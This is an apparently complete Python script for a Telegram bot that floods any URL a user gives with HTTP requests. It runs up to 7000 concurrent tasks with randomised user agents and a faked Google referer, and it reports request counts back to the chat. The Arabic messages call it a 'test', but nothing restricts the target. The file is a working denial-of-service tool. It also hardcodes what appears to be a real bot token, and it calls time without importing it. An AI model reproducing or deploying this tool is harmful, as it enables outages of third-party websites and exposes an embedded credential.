import asyncio
import aiohttp
import random
from fake_useragent import UserAgent
import telebot
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# إعدادات النظام
MAX_THREADS = 7000
REQUEST_TIMEOUT = 30
MAX_RETRIES = 5
REPORT_SENT = False  # متغير لتتبع إرسال التقرير

# متغيرات التحكم
stop_system = False
ua = UserAgent()

class AttackManager:
    def __init__(self, bot, chat_id):
        self.session = None
        self.active_tasks = []
        self.bot = bot
        self.chat_id = chat_id
        self.start_time = None
        self.request_count = 0
    
    async def create_session(self):
        connector = aiohttp.TCPConnector(limit=0, force_close=True)
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    
    async def send_request(self, target):
        global REPORT_SENT
        retry_count = 0
        while not stop_system and retry_count < MAX_RETRIES:
            try:
                headers = {
                    'User-Agent': ua.random,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Referer': 'https://www.google.com/',
                    'Cache-Control': 'no-cache'
                }
                
                async with self.session.get(target, headers=headers) as response:
                    await response.read()
                    self.request_count += 1
                    
                    # إرسال التقرير مرة واحدة فقط بعد 1000 طلب
                    if self.request_count > 10000 and not REPORT_SENT:
                        REPORT_SENT = True
                        duration = int(time.time() - self.start_time)
                        report = (
                            f"📊 تقرير أولي:\n"
                            f"• عدد الطلبات: {self.request_count}\n"
                            f"• المدة: {duration} ثانية\n"
                            f"• الحالة: قيد التشغيل"
                        )
                        await self.bot.send_message(self.chat_id, report)
                    
                    await asyncio.sleep(random.uniform(0.1, 0.3))
                    
            except Exception as e:
                retry_count += 1
                await asyncio.sleep(1)
    
    async def start_attack(self, target, num_threads):
        self.start_time = time.time()
        await self.create_session()
        self.active_tasks = [self.send_request(target) for _ in range(num_threads)]
        await asyncio.gather(*self.active_tasks)
    
    async def cleanup(self):
        if self.session:
            await self.session.close()

async def run_attack(target, bot, chat_id):
    manager = AttackManager(bot, chat_id)
    try:
        await manager.start_attack(target, MAX_THREADS)
    finally:
        await manager.cleanup()
        # إرسال تقرير الإيقاف النهائي
        if not stop_system:  # إذا توقف بسبب خطأ وليس بأمر /stop
            duration = int(time.time() - manager.start_time)
            report = (
                f"🛑 توقف غير متوقع:\n"
                f"• إجمالي الطلبات: {manager.request_count}\n"
                f"• المدة الكلية: {duration} ثانية"
            )
            await bot.send_message(chat_id, report)

def start_attack_thread(target, bot, chat_id):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_attack(target, bot, chat_id))
    loop.close()

# إعداد بوت التليجرام
bot = telebot.TeleBot("7248287448:AAFQcPnXrEaNaIFM-Lx_3VizIiv_9glWXCA")

@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    bot.reply_to(message, "أهلاً! أوامر النظام:\n"
                         "/attack [رابط] - بدء الاختبار\n"
                         "/stop - إيقاف الاختبار")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global stop_system, REPORT_SENT
    try:
        target = message.text.split()[1]
        if not target.startswith(('http://', 'https://')):
            bot.reply_to(message, "يجب أن يبدأ الرابط بـ http:// أو https://")
            return
        
        stop_system = False
        REPORT_SENT = False
        bot.reply_to(message, f"⚡ بدء الاختبار على {target}...")
        ThreadPoolExecutor(max_workers=1).submit(
            start_attack_thread, 
            target, 
            bot, 
            message.chat.id
        )
    except IndexError:
        bot.reply_to(message, "الاستخدام: /attack [رابط الموقع]")

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    global stop_system
    stop_system = True
    bot.reply_to(message, "🛑 تم إيقاف الاختبار بنجاح")

if __name__ == "__main__":
    bot.polling()
